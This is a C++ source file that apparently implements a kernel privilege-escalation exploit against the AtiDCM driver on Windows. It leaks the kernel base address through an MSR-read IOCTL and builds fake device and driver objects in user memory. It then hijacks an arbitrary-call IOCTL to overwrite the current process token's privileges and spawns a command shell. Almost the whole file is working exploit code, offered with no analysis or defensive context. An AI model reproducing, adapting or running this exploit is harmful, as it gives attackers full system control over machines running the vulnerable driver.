#include <iostream>
#include <windows.h>
#include <winternl.h>

typedef struct _IO_TIMER* PIO_TIMER;
typedef short CSHORT;
#define DEVICE_TYPE ULONG;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5
#define NT_BASE 0xfffff80025a00000


DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
DWORD64 g_kisystemcall64 = 0;

typedef struct _VPB {
	CSHORT Type;
	CSHORT Size;
	USHORT Flags;
	USHORT VolumeLabelLength; // in bytes
	struct _DEVICE_OBJECT* DeviceObject;
	struct _DEVICE_OBJECT* RealDevice;
	ULONG SerialNumber;
	ULONG ReferenceCount;
	WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, * PVPB;

typedef enum _IO_ALLOCATION_ACTION {
	KeepObject = 1,
	DeallocateObject,
	DeallocateObjectKeepRegisters
} IO_ALLOCATION_ACTION, * PIO_ALLOCATION_ACTION;

typedef
_Function_class_(DRIVER_CONTROL)
_IRQL_requires_same_
IO_ALLOCATION_ACTION
DRIVER_CONTROL(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp,
	_In_ PVOID MapRegisterBase,
	_In_ PVOID Context
);
typedef DRIVER_CONTROL* PDRIVER_CONTROL;

typedef struct _KDEVICE_QUEUE_ENTRY {
	LIST_ENTRY DeviceListEntry;
	ULONG SortKey;
	BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, * PKDEVICE_QUEUE_ENTRY, * PRKDEVICE_QUEUE_ENTRY;

typedef struct _WAIT_CONTEXT_BLOCK {
	union {
		KDEVICE_QUEUE_ENTRY WaitQueueEntry;
		struct {
			LIST_ENTRY DmaWaitEntry;
			ULONG NumberOfChannels;
			ULONG SyncCallback : 1;
			ULONG DmaContext : 1;
			ULONG ZeroMapRegisters : 1;
			ULONG Reserved : 9;
			ULONG NumberOfRemapPages : 20;
		};
	};
	PDRIVER_CONTROL DeviceRoutine;
	PVOID DeviceContext;
	ULONG NumberOfMapRegisters;
	PVOID DeviceObject;
	PVOID CurrentIrp;
	PVOID BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, * PWAIT_CONTEXT_BLOCK;

typedef struct _KDPC {
	union {
		ULONG TargetInfoAsUlong;
		struct {
			UCHAR Type;
			UCHAR Importance;
			volatile USHORT Number;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;

	SINGLE_LIST_ENTRY DpcListEntry;
	KAFFINITY ProcessorHistory;
	PVOID DeferredRoutine;
	PVOID DeferredContext;
	PVOID SystemArgument1;
	PVOID SystemArgument2;
	__volatile PVOID DpcData;
} KDPC, * PKDPC, * PRKDPC;


typedef struct _KDEVICE_QUEUE {
	CSHORT Type;
	CSHORT Size;
	LIST_ENTRY DeviceListHead;
	KSPIN_LOCK Lock;

#if defined(_AMD64_)

	union {
		BOOLEAN Busy;
		struct {
			LONG64 Reserved : 8;
			LONG64 Hint : 56;
		};
	};

#else

	BOOLEAN Busy;

#endif

} KDEVICE_QUEUE, * PKDEVICE_QUEUE, * PRKDEVICE_QUEUE;

typedef struct _DISPATCHER_HEADER {
	union {
		union {
			volatile LONG Lock;
			LONG LockNV;
		} DUMMYUNIONNAME;

		struct {                            // Events, Semaphores, Gates, etc.
			UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
			UCHAR Signalling;
			UCHAR Size;
			UCHAR Reserved1;
		} DUMMYSTRUCTNAME;

		struct {                            // Timer
			UCHAR TimerType;
			union {
				UCHAR TimerControlFlags;
				struct {
					UCHAR Absolute : 1;
					UCHAR Wake : 1;
					UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
				} DUMMYSTRUCTNAME;
			};

			UCHAR Hand;
			union {
				UCHAR TimerMiscFlags;
				struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

					UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

					UCHAR Index : 1;
					UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

					UCHAR Inserted : 1;
					volatile UCHAR Expired : 1;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;
		} DUMMYSTRUCTNAME2;

		struct {                            // Timer2
			UCHAR Timer2Type;
			union {
				UCHAR Timer2Flags;
				struct {
					UCHAR Timer2Inserted : 1;
					UCHAR Timer2Expiring : 1;
					UCHAR Timer2CancelPending : 1;
					UCHAR Timer2SetPending : 1;
					UCHAR Timer2Running : 1;
					UCHAR Timer2Disabled : 1;
					UCHAR Timer2ReservedFlags : 2;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR Timer2ComponentId;
			UCHAR Timer2RelativeId;
		} DUMMYSTRUCTNAME3;

		struct {                            // Queue
			UCHAR QueueType;
			union {
				UCHAR QueueControlFlags;
				struct {
					UCHAR Abandoned : 1;
					UCHAR DisableIncrement : 1;
					UCHAR QueueReservedControlFlags : 6;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR QueueSize;
			UCHAR QueueReserved;
		} DUMMYSTRUCTNAME4;

		struct {                            // Thread
			UCHAR ThreadType;
			UCHAR ThreadReserved;

			union {
				UCHAR ThreadControlFlags;
				struct {
					UCHAR CycleProfiling : 1;
					UCHAR CounterProfiling : 1;
					UCHAR GroupScheduling : 1;
					UCHAR AffinitySet : 1;
					UCHAR Tagged : 1;
					UCHAR EnergyProfiling : 1;
					UCHAR SchedulerAssist : 1;

#if !defined(_X86_)

					UCHAR ThreadReservedControlFlags : 1;

#else

					UCHAR Instrumented : 1;

#endif

				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			union {
				UCHAR DebugActive;

#if !defined(_X86_)

				struct {
					BOOLEAN ActiveDR7 : 1;
					BOOLEAN Instrumented : 1;
					BOOLEAN Minimal : 1;
					BOOLEAN Reserved4 : 2;
					BOOLEAN AltSyscall : 1;
					BOOLEAN UmsScheduled : 1;
					BOOLEAN UmsPrimary : 1;
				} DUMMYSTRUCTNAME;

#endif

			} DUMMYUNIONNAME2;
		} DUMMYSTRUCTNAME5;

		struct {                         // Mutant
			UCHAR MutantType;
			UCHAR MutantSize;
			BOOLEAN DpcActive;
			UCHAR MutantReserved;
		} DUMMYSTRUCTNAME6;
	} DUMMYUNIONNAME;

	LONG SignalState;                   // Object lock
	LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;


typedef struct _KEVENT {
	DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT, * PRKEVENT;

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
	CSHORT Type;
	USHORT Size;
	LONG ReferenceCount;
	struct _DRIVER_OBJECT* DriverObject;
	struct _DEVICE_OBJECT* NextDevice;
	struct _DEVICE_OBJECT* AttachedDevice;
	struct _IRP* CurrentIrp;
	PIO_TIMER Timer;
	ULONG Flags;                                // See above:  DO_...
	ULONG Characteristics;                      // See ntioapi:  FILE_...
	__volatile PVPB Vpb;
	PVOID DeviceExtension;
	ULONG DeviceType;
	CCHAR StackSize;
	union {
		LIST_ENTRY ListEntry;
		WAIT_CONTEXT_BLOCK Wcb;
	} Queue;
	ULONG AlignmentRequirement;
	KDEVICE_QUEUE DeviceQueue;
	KDPC Dpc;

	//
	//  The following field is for exclusive use by the filesystem to keep
	//  track of the number of Fsp threads currently using the device
	//

	ULONG ActiveThreadCount;
	PSECURITY_DESCRIPTOR SecurityDescriptor;
	KEVENT DeviceLock;

	USHORT SectorSize;
	USHORT Spare1;

	struct _DEVOBJ_EXTENSION* DeviceObjectExtension;
	PVOID  Reserved;

} DEVICE_OBJECT;

typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;


//0x18 bytes (sizeof)
struct _SEP_TOKEN_PRIVILEGES
{
	ULONGLONG Present;                                                      //0x0
	ULONGLONG Enabled;                                                      //0x8
	ULONGLONG EnabledByDefault;                                             //0x10
};

//0x498 bytes (sizeof)
typedef struct _TOKEN
{
	struct _TOKEN_SOURCE TokenSource;                                       //0x0
	struct _LUID TokenId;                                                   //0x10
	struct _LUID AuthenticationId;                                          //0x18
	struct _LUID ParentTokenId;                                             //0x20
	union _LARGE_INTEGER ExpirationTime;                                    //0x28
	struct _ERESOURCE* TokenLock;                                           //0x30
	struct _LUID ModifiedId;                                                //0x38
	struct _SEP_TOKEN_PRIVILEGES Privileges;                                //0x40
	PBYTE useless;
}TOKEN, * PTOKEN;

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

// handle information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;

void printBuffer(PCHAR buf, char* name, SIZE_T size) {
	printf("%s:\n", name);
	for (int i = 0; i < size; i++) {
		printf("buf[%d] = 0x%x\n", i, buf[i]);
	}

}

BOOL readMSR(DWORD msr_value, PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	*((DWORD*)inputBuffer) = msr_value;

	if (inputBuffer == NULL)
		return -2;

	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);


	DWORD bytesRet = 0;


	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_READMSR,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_READMSR \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}
	return res;
}

PVOID GetKAddrFromHandle(HANDLE handle) {
	ULONG returnLength = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength);

	ULONG numberOfHandles = handleTableInformation->NumberOfHandles;

	HeapFree(GetProcessHeap(), 0, handleTableInformation);
	handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100);
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100, &returnLength);

	for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

		if (handleInfo.HandleValue == (USHORT)handle && handleInfo.UniqueProcessId == GetCurrentProcessId())
		{
			return handleInfo.Object;
		}
	}
}

unsigned int ExtractPml4Index(PVOID address)
{
	return ((uintptr_t)address >> 39) & 0x1ff;
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		21,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	char* object = (char*)VirtualAlloc(
		(LPVOID)(0x0000001afeffe000),
		0x12000,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	printf("[+] object = 0x%p\n", object);
	object = (char*)(0x1aff000000 - 0x30);
	printf("[+] second object = 0x%p\n", object);

	PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);

	memset(object, 0x41, 0x30);

	printf("[+] ptr = 0x%p\n", ptr);
	char* object2 = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	printf("[+] object2 = 0x%p\n", object2); //0x0000001af5ff0000
	memset(object2, 0x43, 0x30);

	char* driverObject = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memset(driverObject, 0x50, SIZE_BUF);
	printf("[+] driverObject = 0x%p\n", driverObject);
	char* ptrDriver = driverObject + 0x30;
	char* pDriverFunction = ptrDriver + 0x1b * 8 + 0x70;

	* ((PDWORD64)pDriverFunction) = g_ntbase + 0x7f06a0;   //address of DbgkpTriageDumpRestoreState


	memset(ptr->AttachedDevice, 0x42, SIZE_BUF - 0x40);
	//*((DWORD*)ptr->AttachedDevice) = 0xf6000000;

	printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);


	HANDLE TokenHandle = NULL;
	PVOID tokenAddr = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &TokenHandle))
		tokenAddr = GetKAddrFromHandle(TokenHandle);
	printf("tokenHandle = 0x%p\n", TokenHandle);
	printf("tokenAddr = 0x%p\n", tokenAddr);

	char* token_buf = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
	ptr->AttachedDevice->AttachedDevice = 0;


	//kernel address of token privileges
	DWORD64 kaddr_tokenprivileges = (DWORD64)tokenAddr + 0x40;

	//ptr->AttachedDevice corresponds to rcx when we hijack execution to DbgkpTriageDumpRestoreState
	//offset 0x10 (AttachedDevice->NextDevice) we store the value of the arbitrary write

	ptr->AttachedDevice->NextDevice = (_DEVICE_OBJECT*)0x0000001ff2ffffbc;  //value of arbitrary write

	//offset 0x0 (AttachedDevice->Type,Size,ReferenceCount) we store the address that is stored in rdx by DbgkpTriageDumpRestoreState
	PDWORD64 prdx_val = (PDWORD64)ptr->AttachedDevice;
	*prdx_val = (DWORD64)kaddr_tokenprivileges - 0x2078;


	char* ptr2 = inputBuffer;
	*(ptr2) = 0;
	ptr2 += 1;
	*((PDWORD64)ptr2) = (DWORD64)ptr;


	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);

	DWORD bytesRet = 0;

	getchar();
	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_ARBITRARYCALLDRIVER,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}
	return res;
}

int main()
{
#ifndef _DEBUG
	DWORD bytesRet = 0;


	g_device = CreateFileA(
		"\\\\.\\AtiDCM",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);



	if (g_device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%8p\n", g_device);
#endif


	char* outputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);


	memset(outputBuffer, 0x0, SIZE_BUF);

#ifndef _DEBUG

	//if (readMSR(IA32_GS_BASE, outputBuffer, SIZE_BUF)) {
	//	printf("[+] readMSR success.\n");
	//	printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer+12)));
	//	printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
	//	/*printBuffer(outputBuffer, (char*)"outputBuffer", SIZE_BUF);*/
	//}

	if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
		printf("[+] readMSR success.\n");
		printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
		//printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
		g_kisystemcall64 = *((DWORD64*)(outputBuffer + 12));
		g_ntbase = (DWORD64)g_kisystemcall64 - 0x42b700;
		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
	}
#endif

	arbitraryCallDriver(outputBuffer, SIZE_BUF);
	printf("[+] arbitraryCallDriver returned successfully.\n");
	printf("[*] spawning system shell...\n");
	system("cmd.exe");
	return 0;
}